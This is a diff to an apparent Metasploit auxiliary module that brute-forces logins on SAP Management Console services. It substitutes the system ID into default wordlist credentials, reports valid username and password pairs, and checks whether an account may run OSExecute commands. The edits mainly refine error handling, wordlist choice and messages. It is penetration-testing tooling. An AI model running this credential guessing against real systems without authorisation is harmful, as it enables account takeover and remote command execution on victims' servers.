@@ -11,7 +11,7 @@
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class Metasploit4 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::HttpClient
 	include Msf::Auxiliary::Report
@@ -58,11 +58,17 @@ class Metasploit3 < Msf::Auxiliary
 					'User-Agent' => datastore['UserAgent']
 				}
 		}, 25)
-		return if not res
 
-		if datastore['SAP_SID']
-			if datastore['USER_FILE']
-				print_status("SAPSID set to '#{datastore['SAP_SID']}' - Using provided wordlist without modification")
+		if not res
+			print_error("#{rhost}:#{rport} [SAP] Unable to connect")
+			return
+		end
+
+		if datastore['SAP_SID'] != ''
+			if !datastore['USER_FILE'].nil?
+				print_status("SAPSID set to '#{datastore['SAP_SID']}' - Using provided wordlist")
+			elsif !datastore['USERPASS_FILE'].nil?
+				print_status("SAPSID set to '#{datastore['SAP_SID']}' - Using provided wordlist")
 			else
 				print_status("SAPSID set to '#{datastore['SAP_SID']}' - Setting default SAP wordlist")
 				datastore['USER_FILE'] = Msf::Config.data_directory + '/wordlists/sap_common.txt'
@@ -76,7 +82,9 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def enum_user(user, pass)
-		if datastore['USER_FILE'] == Msf::Config.data_directory + '/wordlists/sap_common.txt' and datastore['SAP_SID']
+
+		# Replace placeholder with SAP SID, if present
+		if datastore['SAP_SID'] != ''
 			user = user.gsub("<SAPSID>", datastore["SAP_SID"].downcase)
 			pass = pass.gsub("<SAPSID>", datastore["SAP_SID"])
 		end
@@ -143,12 +151,12 @@ class Metasploit3 < Msf::Auxiliary
 		end
 
 		if success
-			print_good("#{rhost}:#{rport} [SAP Management Console] Successful login '#{user}' password: '#{pass}'")
+			print_good("#{rhost}:#{rport} [SAP] Successful login '#{user}' password: '#{pass}'")
 
 			if permission
-				vprint_good("#{rhost}:#{rport} [SAP Management Console] Login '#{user}' authorized to perform OSExecute calls")
+				vprint_good("#{rhost}:#{rport} [SAP] Login '#{user}' authorized to perform OSExecute calls")
 			else
-				vprint_error("#{rhost}:#{rport} [SAP Management Console] Login '#{user}' NOT authorized to perform OSExecute calls")
+				vprint_error("#{rhost}:#{rport} [SAP] Login '#{user}' NOT authorized to perform OSExecute calls")
 			end
 
 			report_auth_info(
@@ -163,7 +171,7 @@ class Metasploit3 < Msf::Auxiliary
 			)
 			return
 		else
-			vprint_error("#{rhost}:#{rport} [SAP Management Console] failed to login as '#{user}' password: '#{pass}'")
+			vprint_error("#{rhost}:#{rport} [SAP] failed to login as '#{user}':'#{pass}'")
 			return
 		end
 	end
